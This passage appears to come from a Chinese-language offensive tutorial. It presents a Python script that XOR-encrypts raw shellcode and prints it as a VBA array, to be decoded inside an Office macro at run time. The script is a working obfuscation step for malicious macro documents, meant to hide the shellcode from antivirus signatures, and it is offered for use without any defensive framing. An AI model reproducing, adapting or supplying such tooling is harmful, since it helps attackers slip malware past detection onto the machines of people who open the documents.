## 二、XOR 加密版本

### 2.1 加密器 (Python)

```python
#!/usr/bin/env python3
"""
Shellcode XOR 加密器
生成 VBA 格式的加密 Shellcode
"""

import sys

def xor_encrypt(data, key):
    """XOR 加密"""
    return bytes([b ^ key for b in data])

def to_vba_array(data, var_name="buf"):
    """转换为 VBA 数组格式"""
    lines = []
    line = f"{var_name} = Array("

    for i, b in enumerate(data):
        if i > 0:
            line += ", "
        if len(line) > 80:
            lines.append(line + "_")
            line = "        "
        line += str(b)

    line += ")"
    lines.append(line)
    return "\n".join(lines)

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <shellcode_file> [key]")
        sys.exit(1)

    # 读取 Shellcode
    with open(sys.argv[1], 'rb') as f:
        shellcode = f.read()

    # XOR 密钥
    key = int(sys.argv[2]) if len(sys.argv) > 2 else 0x41

    print(f"[*] Original size: {len(shellcode)} bytes")
    print(f"[*] XOR key: 0x{key:02X} ({key})")

    # 加密
    encrypted = xor_encrypt(shellcode, key)

    # 输出 VBA 格式
    print("\n' === VBA Code ===")
    print(f"' XOR Key: {key}")
    print(to_vba_array(encrypted))

    print(f"\n[+] Done! Use key {key} to decrypt in VBA")

if __name__ == "__main__":
    main()
```
